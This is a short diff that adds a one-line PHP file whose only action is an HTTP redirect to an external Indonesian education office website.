@@ -1,0 +1,1 @@
+<?php header("Location:https://cabdisdiksunggal.web.id/");?>
